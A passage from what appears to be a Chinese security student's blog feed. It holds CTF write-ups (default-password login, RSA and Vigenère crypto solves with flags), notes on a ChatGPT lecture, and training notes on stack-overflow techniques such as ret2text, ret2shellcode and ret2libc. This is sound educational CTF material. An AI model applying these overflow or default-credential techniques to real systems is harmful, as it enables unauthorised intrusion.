解答</h3>\n<p>题目提示默认口令说明此题的账户密码是网关默认密码，最后通过以前收集到的常用默认弱口令发现账户密码，获得此题 flag 。</p>\n<p>浏览器搜索 <code>eyou网关默认密码</code> ，检索可用信息发现使用说明手册，可能含有默认密码</p>\n<p><img data-src=\"image-20231029154402660.png\" alt=\"image-20231029154402660\"></p>\n<p>输入默认用户和密码即可进入，取得 flag</p>\n<p><img data-src=\"image-20231029154627031.png\" alt=\"image-20231029154627031\"></p>\n<p><code>ctfhub&#123;9a144963febd150940d7e538&#125;</code></p>\n",
            "tags": [
                "CTFHUB"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/30/%E6%9D%8E%E5%AE%8F%E6%AF%852023%E6%98%A5%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B/",
            "url": "http://yanagi-kon.github.io/2023/10/30/%E6%9D%8E%E5%AE%8F%E6%AF%852023%E6%98%A5%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B/",
            "title": "李宏毅2023春机器学习课程",
            "date_published": "2023-10-30T04:24:13.000Z",
            "content_html": "<h1 id=\"李宏毅2023春机器学习课程\"><a class=\"markdownIt-Anchor\" href=\"#李宏毅2023春机器学习课程\">#</a> 李宏毅 2023 春机器学习课程</h1>\n<h2 id=\"chatgpt-原理刨析\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-原理刨析\">#</a> ChatGPT 原理刨析</h2>\n<p>ChatGPT 不是联网的，并且目前的回答对于 2021 年以后的信息不太准确。</p>\n<p>ChatGPT 所做的就是 文字接龙（语言模型），获得文字的几率，所以每一次的输出结果可能并不相同，并且在每次选出一个词之后，再将该词语加入到输入之后，继续进行处理，获得下一个文字，直到获得 end。</p>\n<p><img data-src=\"image-20231025170524582.png\" alt=\"image-20231025170524582\"></p>\n<p><img data-src=\"image-20231025170707067.png\" alt=\"image-20231025170707067\"></p>\n<p>为了使 ChatGPT 具有根据历史记录进行回答的能力，其实每一次都会将历史记录也和当前的问题一起丢入输入当中</p>\n<p><img data-src=\"image-20231025170907180.png\" alt=\"image-20231025170907180\"></p>\n<p>这个函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span> 的参数大概会有 1700 亿个参数。</p>\n<p>ChatGPT 的训练过程：</p>\n<p><img data-src=\"image-20231025171201704.png\" alt=\"image-20231025171201704\"></p>\n<h2 id=\"chatgpt-关键技术-预训练\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-关键技术-预训练\">#</a> ChatGPT 关键技术 预训练</h2>\n<p><code>预训练</code> （Pre-train）又称为  <code>自督导式学习</code> （Self-supervised Learning），其所得到的模型又被称为 <code>基石模型</code> （Foundation Model）。</p>\n<p>ChatGPT 即 基于 Transformer 预训练的生成式聊天（Chat Generative Pre-trained Transformer）。</p>\n<h3 id=\"0x01-预训练\"><a class=\"markdownIt-Anchor\" href=\"#0x01-预训练\">#</a> 0x01 预训练</h3>\n<p>网络上每一段文字都可以教机器做文字接龙，GPT 就是使用的网络上的内容进行训练。</p>\n<p>GPT-1、GPT-2、GPT-3 在模型上逐渐更大，性能也逐渐更好，从 100 多 M 到 175G，但这个时候没有人来进行干预，所以 GPT 模型的输出有时候是无厘头的。</p>\n<p>GPT 通过督导式训练后才变成了 ChatGPT，经过 <code>微调</code> （finetune）。</p>\n<p><img data-src=\"image-20231025201302259.png\" alt=\"image-20231025201302259\"></p>\n<h3 id=\"0x02-预训练的帮助\"><a class=\"markdownIt-Anchor\" href=\"#0x02-预训练的帮助\">#</a> 0x02 预训练的帮助</h3>\n<p>在多种语言上做预训练，只要教某一种语言的某一个任务，可以自动学会其他语言的同样任务。</p>\n<h3 id=\"0x03-增强式学习\"><a class=\"markdownIt-Anchor\" href=\"#0x03-增强式学习\">#</a> 0x03 增强式学习</h3>\n<p>给与的反馈比较简单，并且适用于答案不确定的情况，只需要给反馈就好了。</p>\n<p><img data-src=\"image-20231025202525131.png\" alt=\"image-20231025202525131\"></p>\n<h2 id=\"chatgpt-带来的研究问题\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-带来的研究问题\">#</a> ChatGPT 带来的研究问题</h2>\n<h3 id=\"0x01-如何精准提出问题\"><a class=\"markdownIt-Anchor\" href=\"#0x01-如何精准提出问题\">#</a> 0x01 如何精准提出问题</h3>\n<p>对 ChatGPT 进行催眠（Prompting）。</p>\n<p><img data-src=\"image-20231025203022489.png\" alt=\"image-20231025203022489\"></p>\n<h3 id=\"0x02-如何更正错误\"><a class=\"markdownIt-Anchor\" href=\"#0x02-如何更正错误\">#</a> 0x02 如何更正错误</h3>\n<h3 id=\"0x03-如何侦测ai生成\"><a class=\"markdownIt-Anchor\" href=\"#0x03-如何侦测ai生成\">#</a> 0x03 如何侦测 AI 生成</h3>\n<h3 id=\"0x04-不小心泄露秘密\"><a class=\"markdownIt-Anchor\" href=\"#0x04-不小心泄露秘密\">#</a> 0x04 不小心泄露秘密</h3>\n<p>Machine Unlearning</p>\n<h2 id=\"用chatgpt玩文字冒险游戏\"><a class=\"markdownIt-Anchor\" href=\"#用chatgpt玩文字冒险游戏\">#</a> 用 ChatGPT 玩文字冒险游戏</h2>\n<p>首先对 ChatGPT 进行催眠</p>\n<p><img data-src=\"image-20231025204043723.png\" alt=\"image-20231025204043723\"></p>\n<p>再加上游戏插图</p>\n<p><img data-src=\"image-20231025204224842.png\" alt=\"image-20231025204224842\"></p>\n<h2 id=\"chatgpt-是怎么炼成的\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-是怎么炼成的\">#</a> ChatGPT 是怎么炼成的</h2>\n<h3 id=\"gpt-社会化的过程\"><a class=\"markdownIt-Anchor\" href=\"#gpt-社会化的过程\">#</a> GPT 社会化的过程</h3>\n<p>ChatGPT 和 Insruct GPT 很像，通过 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzIyMDMuMDIxNTU=\">Instruct GPT</span> 就可以知道 ChatGPT 是怎么被训练出来的。</p>\n<p><img data-src=\"image-20231029161250167.png\" alt=\"image-20231029161250167\"></p>\n<h3 id=\"chatgpt-学习的四个阶段\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-学习的四个阶段\">#</a> ChatGPT 学习的四个阶段</h3>\n<h4 id=\"学习文字接龙\"><a class=\"markdownIt-Anchor\" href=\"#学习文字接龙\">#</a> 学习文字接龙</h4>\n<p>不需要人工介入，GPT 自己在网络上学习，GPT 学到的是概率，从概率分布中进行随机抽取，因而 GPT 的每一次输出都是不一样的。</p>\n<p><img data-src=\"image-20231029161642223.png\" alt=\"image-20231029161642223\"></p>\n<p>文字接龙就足够用于进行 问题回答 了，但是回答往往没有目的性。</p>\n<h4 id=\"人类老师引导文字接龙的方向\"><a class=\"markdownIt-Anchor\" href=\"#人类老师引导文字接龙的方向\">#</a> 人类老师引导文字接龙的方向</h4>\n<p>找人来思考想问 GPT 的问题，并人工给出正确答案（告诉 GPT 以后多看这些类似的有益的文句，不要去网络上看一些有的没的）。不需要穷尽所有的问题，我们只要告诉 GPT 人类的偏好，大概提供几个范例就够了。</p>\n<h4 id=\"模仿人类老师的喜好\"><a class=\"markdownIt-Anchor\" href=\"#模仿人类老师的喜好\">#</a> 模仿人类老师的喜好</h4>\n<p>GPT 只要学习人类对哪一类回答的喜爱程度，不需要正确答案，只要知道人类对于答案的选择，就可以通过构建 Teacher Model 学习，自己得知，在众多回答中，哪一个答案是较好的，而哪些答案是差劲的。</p>\n<p><img data-src=\"image-20231029162452659.png\" alt=\"image-20231029162452659\"></p>\n<h4 id=\"用增强式学习向模拟老师学习\"><a class=\"markdownIt-Anchor\" href=\"#用增强式学习向模拟老师学习\">#</a> 用增强式学习向模拟老师学习</h4>\n<p>ChatGPT 进行自问自答，学习应该给出那种回答更正确。</p>\n<p><img data-src=\"image-20231029162750618.png\" alt=\"image-20231029162750618\"></p>\n",
            "tags": [
                "机器学习"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/16/10.06%20SUS%E5%9F%B9%E8%AE%AD/",
            "url": "http://yanagi-kon.github.io/2023/10/16/10.06%20SUS%E5%9F%B9%E8%AE%AD/",
            "title": "10.06 SUS培训",
            "date_published": "2023-10-16T06:31:00.000Z",
            "content_html": "<h2 id=\"1006-sus培训\"><a class=\"markdownIt-Anchor\" href=\"#1006-sus培训\">#</a> 10.06 SUS 培训</h2>\n<h3 id=\"基本知识点\"><a class=\"markdownIt-Anchor\" href=\"#基本知识点\">#</a> 基本知识点</h3>\n<p>1. 程序在 32 位中传递参数为 栈传递，在 64 位中通过寄存器传递</p>\n<p>2. 变量存储</p>\n<ul>\n<li>未初始化的全局变量 存放在 BSS 段</li>\n<li>初始化的全局变量存放在 Data 段</li>\n<li>函数存放在 Text 段</li>\n<li>局部变量存放在栈段</li>\n<li>主动申请的内存在堆部分</li>\n<li>read 函数等存放在 shared libraries</li>\n</ul>\n<h3 id=\"简单栈溢出\"><a class=\"markdownIt-Anchor\" href=\"#简单栈溢出\">#</a> 简单栈溢出</h3>\n<p><img data-src=\"image-20231006153909131.png\" alt=\"image-20231006153909131\"></p>\n<p><img data-src=\"image-20231006154804670.png\" alt=\"image-20231006154804670\"></p>\n<h4 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h4>\n<p><img data-src=\"image-20231006155442449.png\" alt=\"image-20231006155442449\"></p>\n<p><code>print name</code>  将  <code>0x100</code>  的数据拷贝到 只有 15 个字节的 <code>buf</code>  中，就会溢出。读入超过 15 字节的数据，就会将下面的内容覆盖，把返回地址的值覆盖为 <code>shell()</code>  函数的地址，就可以跳转到 <code>shell</code>  完成攻击。</p>\n<p>一般的，先使用  <code>checksec</code>  查看保护机制：</p>\n<p><img data-src=\"image-20231006155901627.png\" alt=\"image-20231006155901627\"></p>\n<p><code>NX</code>  有效防止 <code>shellcode注入</code> 攻击。 <code>PIE</code>  地址随机化的保护。</p>\n<p>攻击代码如下：</p>\n<p><img data-src=\"image-20231006160640430.png\" alt=\"image-20231006160640430\"></p>\n<p>至少 15 个字节将 buf 覆盖掉，再写 8 个字节将 ebp 覆盖掉，最后再覆盖返回地址，覆盖为后门函数的返回值。但是这样会导致栈没有对齐，从而报错。于是利用查看 ret 的地址：</p>\n<p><img data-src=\"image-20231006161404605.png\" alt=\"image-20231006161404605\"></p>\n<p>将 ret 填充到 8 结尾的内容中，这样 shell 会以 0 结尾开始运行从而对其 16 字节不报错。pwn 的解法很多，这只是本题其中一个解法。</p>\n<h4 id=\"ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#ret2shellcode\">#</a> ret2shellcode</h4>\n<p><img data-src=\"image-20231006161936187.png\" alt=\"image-20231006161936187\"></p>\n<p>本题目没有后门函数，需要自行编写 <code>shellcode</code></p>\n<p><img data-src=\"image-20231006162147718.png\" alt=\"image-20231006162147718\"></p>\n<p>题目会将 buf 在栈上的地址告诉你，我们将 buf 的返回地址改为 buf 在栈上的开始地址：</p>\n<p><img data-src=\"image-20231006162512175.png\" alt=\"image-20231006162512175\"></p>\n<p><img data-src=\"image-20231006162919424.png\" alt=\"image-20231006162919424\"></p>\n<p>shellcode 可以用系统自动生成的，也可以用自己写的，编译 shellcode 的能力还是很重要的。可以在 shellcodes databsase 网站中学习。</p>\n<h4 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h4>\n<p><img data-src=\"image-20231006163151506.png\" alt=\"image-20231006163151506\"></p>\n<p>该题开启了 NX 并且没有后门函数。使用 ldd，查看动态库发现有 libc，于是该题从 libc 中开始找。libc 的地址是随机的，但是 write 函数的地址在 libc 中是相对的，知道了就可以获得 libc 的地址。</p>\n<p><img data-src=\"image-20231006164647386.png\" alt=\"image-20231006164647386\"></p>\n<h3 id=\"学习资源\"><a class=\"markdownIt-Anchor\" href=\"#学习资源\">#</a> 学习资源</h3>\n<p><img data-src=\"image-20231006164824858.png\" alt=\"image-20231006164824858\"></p>\n",
            "tags": [
                "知识"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/16/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%20CTF%20%E6%96%B0%E7%94%9F%E8%B5%9B/",
            "url": "http://yanagi-kon.github.io/2023/10/16/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%20CTF%20%E6%96%B0%E7%94%9F%E8%B5%9B/",
            "title": "东南大学 CTF 赛 2023",
            "date_published": "2023-10-16T04:00:00.000Z",
            "content_html": "<h1 id=\"东南大学-ctf-赛\"><a class=\"markdownIt-Anchor\" href=\"#东南大学-ctf-赛\">#</a> 东南大学 CTF 赛</h1>\n<p>[TOC]</p>\n<hr>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"简单signin\"><a class=\"markdownIt-Anchor\" href=\"#简单signin\">#</a> 简单 signin</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long<span class=\"token punctuation\">,</span> getPrime</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> msg <span class=\"token operator\">+</span> <span class=\"token string\">b'\\xff'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">128</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31531</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n = 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c = 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>'''</pre></td></tr></table></figure><p>原本以为这是一道普普通通的 <code>&quot;简单&quot;</code>  题，结果做着做着发现，e 和 phi 不互素，没有办法直接求出 d，去互联网上了解了一下，发现 e 和 q-1 互素，因为 gcd (e,q-1)=1，所以可以改成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>e</mi><mtext>  </mtext><mo>∗</mo><mtext>  </mtext><mi>d</mi><mo>≡</mo><mn>1</mn><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">e\\;*\\;d \\equiv 1\\; mod\\; (q-1) \\\\\nm = c^d\\;mod\\;q\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.46528em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.093548em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span></span></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># from secret import flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31531</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n = 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c = 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</pre></td></tr></table></figure><p>运行后得到 flag：</p>\n<p><img data-src=\"image-20231016083300152.png\" alt=\"image-20231016083300152\"></p>\n<p><code>susctf&#123;d25d84fb-ca13-4dba-9e90-4994f30bef7a&#125;</code></p>\n<h3 id=\"vigenere\"><a class=\"markdownIt-Anchor\" href=\"#vigenere\">#</a> Vigenere</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> key</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"^susctf\\&#123;[0-9a-f]&#123;8&#125;-([0-9a-f]&#123;4&#125;-)&#123;3&#125;[0-9a-f]&#123;12&#125;\\&#125;$\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">assert</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"^[a-z]&#123;10&#125;$\"</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    key<span class=\"token punctuation\">,</span> msg <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            res <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td 